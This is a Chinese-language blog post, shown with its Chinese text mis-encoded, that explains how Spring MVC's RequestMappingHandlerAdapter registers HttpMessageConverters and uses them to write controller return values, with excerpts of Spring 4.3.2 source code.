<h2 id="Springè°ƒç”¨è¿‡ç¨‹"><a href="#Springè°ƒç”¨è¿‡ç¨‹" class="headerlink" title="Springè°ƒç”¨è¿‡ç¨‹"></a>Springè°ƒç”¨è¿‡ç¨‹</h2><p>åœ¨DispatcherServletåˆå§‹åŒ–çš„è¿‡ç¨‹ä¼šè°ƒç”¨ä¸€ä¸ªå«åš<code>initHandlerAdapters</code>çš„æ–¹æ³•ï¼Œ<br>è¯¥æ–¹æ³•å†…éƒ¨ä¼šæ‰«æå®¹å™¨ä¸­æ‰€æœ‰çš„ç±»ï¼Œä»¥åŠä»–ä»¬çš„çˆ¶ç±»ï¼Œæ‰¾åˆ°æ‰€æœ‰å®ç°äº†<code>HandlerAdapter</code>æ¥å£çš„ç±»ï¼Œ<br>å¹¶å°†ä»–ä»¬æ³¨å†Œåˆ°<code>DispatcherServlet</code>çš„<code>HandlerAdapters</code>ä¸­ã€‚</p>
<p>å¦‚æœæ²¡æœ‰æ‰«æåˆ°çš„HandlerAdapterï¼Œè¿™ä¸ªæ–¹æ³•ä¼šåŠ è½½ä¸€äº›é»˜è®¤çš„HandlerAdapterã€‚</p>
<blockquote>
<p>The default implementation uses the â€œDispatcherServlet.propertiesâ€ file (in the same<br>  package as the DispatcherServlet class) to determine the class names. </p>
</blockquote>
  <img src="/2016/11/29/HttpMessageConverter/DispatcherServlet-properties.jpg">
<p>Spring 4.3.2 ä¸­æœ‰ä¸€ä¸ªå®ç°äº†<code>HandlerAdapter</code>æ¥å£çš„ç±»ä¼šè¢«æ‰«æåˆ°ï¼Œè¿™ä¸ªç±»å«åš<code>RequestMappingHandlerAdapter</code></p>
<h3 id="RequestMappingHandlerAdapter"><a href="#RequestMappingHandlerAdapter" class="headerlink" title="RequestMappingHandlerAdapter"></a>RequestMappingHandlerAdapter</h3><p>è¿™ä¸ªç±»åœ¨æ„é€ çš„æ—¶å€™å°±åŠ è½½äº†è®¸å¤šmessageConverter</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RequestMappingHandlerAdapter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringHttpMessageConverter stringHttpMessageConverter = <span class="keyword">new</span> StringHttpMessageConverter();</span><br><span class="line">    stringHttpMessageConverter.setWriteAcceptCharset(<span class="keyword">false</span>);  <span class="comment">// see SPR-7316</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.messageConverters = <span class="keyword">new</span> ArrayList&lt;HttpMessageConverter&lt;?&gt;&gt;(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">this</span>.messageConverters.add(<span class="keyword">new</span> ByteArrayHttpMessageConverter());</span><br><span class="line">    <span class="keyword">this</span>.messageConverters.add(stringHttpMessageConverter);</span><br><span class="line">    <span class="keyword">this</span>.messageConverters.add(<span class="keyword">new</span> SourceHttpMessageConverter&lt;Source&gt;());</span><br><span class="line">    <span class="keyword">this</span>.messageConverters.add(<span class="keyword">new</span> AllEncompassingFormHttpMessageConverter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>AllEncompassingFormHttpMessageConverter</code>ç»§æ‰¿è‡ª<code>FormHttpMessageConverter</code>ï¼Œ å®ƒæœ‰ä¸€ä¸ªå˜é‡å«åš<br><code>partConverters</code>ï¼Œå­˜å‚¨äº†ä¸€ç³»åˆ—çš„<code>HttpMessageConverter</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;HttpMessageConverter&lt;?&gt;&gt; partConverters = <span class="keyword">new</span> ArrayList&lt;HttpMessageConverter&lt;?&gt;&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FormHttpMessageConverter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.supportedMediaTypes.add(MediaType.APPLICATION_FORM_URLENCODED);</span><br><span class="line">    <span class="keyword">this</span>.supportedMediaTypes.add(MediaType.MULTIPART_FORM_DATA);</span><br><span class="line">    <span class="keyword">this</span>.partConverters.add(<span class="keyword">new</span> ByteArrayHttpMessageConverter());</span><br><span class="line">    StringHttpMessageConverter stringHttpMessageConverter = <span class="keyword">new</span> StringHttpMessageConverter();</span><br><span class="line">    stringHttpMessageConverter.setWriteAcceptCharset(<span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">this</span>.partConverters.add(stringHttpMessageConverter);</span><br><span class="line">    <span class="keyword">this</span>.partConverters.add(<span class="keyword">new</span> ResourceHttpMessageConverter());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>åœ¨<code>AllEncompassingFormHttpMessageConverter</code>ä¸­åˆæ ¹æ®classPathä¸­æ˜¯å¦åŒ…å«jacksonã€Gsonç­‰jaråŒ…æ¥åŠ¨æ€çš„<br>æ³¨å†Œäº†ä¸€äº›<code>HttpMessageConverter</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AllEncompassingFormHttpMessageConverter</span> <span class="keyword">extends</span> <span class="title">FormHttpMessageConverter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> jaxb2Present =</span><br><span class="line">            ClassUtils.isPresent(<span class="string">"javax.xml.bind.Binder"</span>, AllEncompassingFormHttpMessageConverter<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> jackson2Present =</span><br><span class="line">            ClassUtils.isPresent(<span class="string">"com.fasterxml.jackson.databind.ObjectMapper"</span>, AllEncompassingFormHttpMessageConverter<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()) &amp;&amp;</span></span><br><span class="line">                    ClassUtils.isPresent("com.fasterxml.jackson.core.JsonGenerator", AllEncompassingFormHttpMessageConverter.class.getClassLoader());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> jackson2XmlPresent =</span><br><span class="line">            ClassUtils.isPresent(<span class="string">"com.fasterxml.jackson.dataformat.xml.XmlMapper"</span>, AllEncompassingFormHttpMessageConverter<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> gsonPresent =</span><br><span class="line">            ClassUtils.isPresent(<span class="string">"com.google.gson.Gson"</span>, AllEncompassingFormHttpMessageConverter<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AllEncompassingFormHttpMessageConverter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        addPartConverter(<span class="keyword">new</span> SourceHttpMessageConverter&lt;Source&gt;());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jaxb2Present &amp;&amp; !jackson2Present) &#123;</span><br><span class="line">            addPartConverter(<span class="keyword">new</span> Jaxb2RootElementHttpMessageConverter());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jackson2Present) &#123;</span><br><span class="line">            addPartConverter(<span class="keyword">new</span> MappingJackson2HttpMessageConverter());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (gsonPresent) &#123;</span><br><span class="line">            addPartConverter(<span class="keyword">new</span> GsonHttpMessageConverter());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jackson2XmlPresent) &#123;</span><br><span class="line">            addPartConverter(<span class="keyword">new</span> MappingJackson2XmlHttpMessageConverter());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è‡³äºè¿™äº›è½¬æ¢å™¨æ˜¯æ€ä¹ˆä½¿ç”¨çš„ï¼Œè¦çœ‹<code>RequestMappingHandlerAdapter</code>ä¸­çš„<code>getDefaultArgumentResolver</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the list of argument resolvers to use including built-in resolvers</span></span><br><span class="line"><span class="comment">     * and custom resolvers provided via &#123;<span class="doctag">@link</span> #setCustomArgumentResolvers&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;HandlerMethodArgumentResolver&gt; <span class="title">getDefaultArgumentResolvers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;HandlerMethodArgumentResolver&gt; resolvers = <span class="keyword">new</span> ArrayList&lt;HandlerMethodArgumentResolver&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Annotation-based argument resolution</span></span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestParamMethodArgumentResolver(getBeanFactory(), <span class="keyword">false</span>));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestParamMapMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> PathVariableMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> PathVariableMapMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> MatrixVariableMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> MatrixVariableMapMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletModelAttributeMethodProcessor(<span class="keyword">false</span>));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestResponseBodyMethodProcessor(getMessageConverters(), <span class="keyword">this</span>.requestResponseBodyAdvice));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestPartMethodArgumentResolver(getMessageConverters(), <span class="keyword">this</span>.requestResponseBodyAdvice));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestHeaderMethodArgumentResolver(getBeanFactory()));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestHeaderMapMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletCookieValueMethodArgumentResolver(getBeanFactory()));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ExpressionValueMethodArgumentResolver(getBeanFactory()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Type-based argument resolution</span></span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletRequestMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletResponseMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> HttpEntityMethodProcessor(getMessageConverters(), <span class="keyword">this</span>.requestResponseBodyAdvice));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RedirectAttributesMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ModelMethodProcessor());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> MapMethodProcessor());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ErrorsMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> SessionStatusMethodArgumentResolver());</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> UriComponentsBuilderMethodArgumentResolver());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Custom arguments</span></span><br><span class="line">        <span class="keyword">if</span> (getCustomArgumentResolvers() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            resolvers.addAll(getCustomArgumentResolvers());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Catch-all</span></span><br><span class="line">        resolvers.add(<span class="keyword">new</span> RequestParamMethodArgumentResolver(getBeanFactory(), <span class="keyword">true</span>));</span><br><span class="line">        resolvers.add(<span class="keyword">new</span> ServletModelAttributeMethodProcessor(<span class="keyword">true</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resolvers;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„Converteræœ€ç»ˆä½œä¸ºä¸€ä¸ªæ„é€ å‚æ•°ä¼ å…¥äº†<code>RequestResponseBodyMethodProcessor</code>å’Œ<code>RequestPartMethodArgumentResolver</code>ã€‚ å‰è€…å…¶å®æ˜¯è´Ÿè´£å¤„ç†<code>@RequestBody</code>å’Œ<code>@ResponseBody</code>çš„,<br>åè€…åˆ™æ˜¯å¤„ç†<code>@RequestPart</code>è¿™ä¸ªæ³¨è§£çš„ã€‚æ‹¿<code>RequestResponseBodyMethodProcessor</code>ä¸ºä¾‹æ¥çœ‹ã€‚</p>
<p>è¿™ä¸ªç±»çš„çˆ¶ç±»å®ç°äº†<code>HandlerMethodReturnValueHandler</code>æ¥å£ï¼Œè¿™ä¸ªæ¥å£çš„ä½œç”¨å¯¹ç…§ä¸Šé¢çš„ç³»ç»Ÿæ•´ä½“æ¶æ„å›¾<br>å¯çŸ¥ï¼Œæ˜¯å¤„ç†Controllerè¿”å›çš„ç»“æœå€¼çš„ï¼Œçœ‹å…¶<code>handleReturnValue</code>æ–¹æ³• ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleReturnValue</span><span class="params">(Object returnValue, MethodParameter returnType,</span></span></span><br><span class="line"><span class="function"><span class="params">        ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException </span>&#123;</span><br><span class="line">    mavContainer.setRequestHandled(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// Try even with null return value. ResponseBodyAdvice could get involved.</span></span><br><span class="line">    writeWithMessageConverters(returnValue, returnType, webRequest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ ‡è®°è¿™ä¸ªè¯·æ±‚å·²ç»å¤„ç†è¿‡äº†ï¼Œç„¶åè°ƒç”¨äº†ä¸€ä¸ªå†…éƒ¨æ–¹æ³•ï¼Œä»åå­—å°±å¯ä»¥çœ‹å‡ºæ¥ï¼Œæ˜¯ä½¿ç”¨MessageConverterè¿›è¡Œ<br>è½¬æ¢ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes the given return value to the given web request. Delegates to</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> #writeWithMessageConverters(Object, MethodParameter, ServletServerHttpRequest, ServletServerHttpResponse)&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">writeWithMessageConverters</span><span class="params">(T returnValue, MethodParameter returnType, NativeWebRequest webRequest)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException </span>&#123;</span><br><span class="line"></span><br><span class="line">    ServletServerHttpRequest inputMessage = createInputMessage(webRequest);</span><br><span class="line">    ServletServerHttpResponse outputMessage = createOutputMessage(webRequest);</span><br><span class="line">    writeWithMessageConverters(returnValue, returnType, inputMessage, outputMessage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çœŸæ­£çš„é€»è¾‘è¿˜æ˜¯å†…éƒ¨çš„`writeWithMessageConveters()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes the given return type to the given output message.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> returnValue the value to write to the output message</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> returnType the type of the value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputMessage the input messages. Used to inspect the &#123;<span class="doctag">@code</span> Accept&#125; header.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputMessage the output message to write to</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException thrown in case of I/O errors</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> HttpMediaTypeNotAcceptableException thrown when the conditions indicated by &#123;<span class="doctag">@code</span> Accept&#125; header on</span></span><br><span class="line"><span class="comment">     * the request cannot be met by the message converters</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">    <span class="keyword">protected</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">writeWithMessageConverters</span><span class="params">(T returnValue, MethodParameter returnType,</span></span></span><br><span class="line"><span class="function"><span class="params">            ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; returnValueClass = getReturnValueType(returnValue, returnType);</span><br><span class="line">        Type returnValueType = getGenericType(returnType);</span><br><span class="line">        HttpServletRequest servletRequest = inputMessage.getServletRequest();</span><br><span class="line">        <span class="comment">//ä»è¯·æ±‚å¤´è·å–å¯èƒ½çš„è¿”å›ç±»å‹ï¼ˆé»˜è®¤ä¼šåŠ è½½ä¸¤ç§ç­–ç•¥ï¼Œæ¯”å¦‚ä»è·¯å¾„åçš„åç¼€ä¸Šæ¨æ–­ï¼‰</span></span><br><span class="line">        List&lt;MediaType&gt; requestedMediaTypes = getAcceptableMediaTypes(servletRequest);</span><br><span class="line">        <span class="comment">//æ ¹æ®è¯·æ±‚å’Œè¿”å›çš„å€¼å¾—ç±»å‹ï¼Œæ¨æ–­å¯èƒ½çš„è¿”å›å€¼ç±»å‹</span></span><br><span class="line">        List&lt;MediaType&gt; producibleMediaTypes = getProducibleMediaTypes(servletRequest, returnValueClass, returnValueType);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (returnValue != <span class="keyword">null</span> &amp;&amp; producibleMediaTypes.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"No converter found for return value of type: "</span> + returnValueClass);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//ç­›é€‰</span></span><br><span class="line">        Set&lt;MediaType&gt; compatibleMediaTypes = <span class="keyword">new</span> LinkedHashSet&lt;MediaType&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MediaType requestedType : requestedMediaTypes) &#123;</span><br><span class="line">            <span class="keyword">for</span> (MediaType producibleType : producibleMediaTypes) &#123;</span><br><span class="line">                <span class="keyword">if</span> (requestedType.isCompatibleWith(producibleType)) &#123;</span><br><span class="line">                    compatibleMediaTypes.add(getMostSpecificMediaType(requestedType, producibleType));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (compatibleMediaTypes.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpMediaTypeNotAcceptableException(producibleMediaTypes);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;MediaType&gt; mediaTypes = <span class="keyword">new</span> ArrayList&lt;MediaType&gt;(compatibleMediaTypes);</span><br><span class="line">        MediaType.sortBySpecificityAndQuality(mediaTypes);</span><br><span class="line"></span><br><span class="line">        MediaType selectedMediaType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (MediaType mediaType : mediaTypes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mediaType.isConcrete()) &#123;<span class="comment">//å…·ä½“çš„ï¼Œæ²¡æœ‰é€šé…ç¬¦çš„</span></span><br><span class="line">                selectedMediaType = mediaType;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">// æ‰¾åˆ°ä¸€ä¸ªå°±è·³å‡ºå¾ªç¯</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (mediaType.equals(MediaType.ALL) || mediaType.equals(MEDIA_TYPE_APPLICATION)) &#123;</span><br><span class="line">                selectedMediaType = MediaType.APPLICATION_OCTET_STREAM;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">// æ‰¾åˆ°ä¸€ä¸ªå°±è·³å‡ºå¾ªç¯</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//æ‰¾åˆ°èƒ½å¤„ç†è¿™ç§ç±»å‹çš„HttpMessageConverter</span></span><br><span class="line">        <span class="keyword">if</span> (selectedMediaType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            selectedMediaType = selectedMediaType.removeQualityValue();</span><br><span class="line">            <span class="keyword">for</span> (HttpMessageConverter&lt;?&gt; messageConverter : <span class="keyword">this</span>.messageConverters) &#123;</span><br><span class="line">                <span class="keyword">if</span> (messageConverter <span class="keyword">instanceof</span> GenericHttpMessageConverter) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (((GenericHttpMessageConverter&lt;T&gt;) messageConverter).canWrite(returnValueType,</span><br><span class="line">                            returnValueClass, selectedMediaType)) &#123;</span><br><span class="line">                        returnValue = (T) getAdvice().beforeBodyWrite(returnValue, returnType, selectedMediaType,</span><br><span class="line">                                (Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt;) messageConverter.getClass(),</span><br><span class="line">                                inputMessage, outputMessage);</span><br><span class="line">                        <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            addContentDispositionHeader(inputMessage, outputMessage);</span><br><span class="line">                            ((GenericHttpMessageConverter&lt;T&gt;) messageConverter).write(returnValue,</span><br><span class="line">                                    returnValueType, selectedMediaType, outputMessage);</span><br><span class="line">                            <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                                logger.debug(<span class="string">"Written ["</span> + returnValue + <span class="string">"] as \""</span> +</span><br><span class="line">                                        selectedMediaType + <span class="string">"\" using ["</span> + messageConverter + <span class="string">"]"</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (messageConverter.canWrite(returnValueClass, selectedMediaType)) &#123;</span><br><span class="line">                    returnValue = (T) getAdvice().beforeBodyWrite(returnValue, returnType, selectedMediaType,</span><br><span class="line">                            (Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt;) messageConverter.getClass(),</span><br><span class="line">                            inputMessage, outputMessage);</span><br><span class="line">                    <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        addContentDispositionHeader(inputMessage, outputMessage);</span><br><span class="line">                        ((HttpMessageConverter&lt;T&gt;) messageConverter).write(returnValue,</span><br><span class="line">                                selectedMediaType, outputMessage);</span><br><span class="line">                        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                            logger.debug(<span class="string">"Written ["</span> + returnValue + <span class="string">"] as \""</span> +</span><br><span class="line">                                    selectedMediaType + <span class="string">"\" using ["</span> + messageConverter + <span class="string">"]"</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (returnValue != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpMediaTypeNotAcceptableException(<span class="keyword">this</span>.allSupportedMediaTypes);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è‡³æ­¤ï¼ŒHttpMessageConverterå¦‚ä½•å·¥ä½œçš„å°±çœŸç›¸å¤§ç™½äº†ã€‚</p>
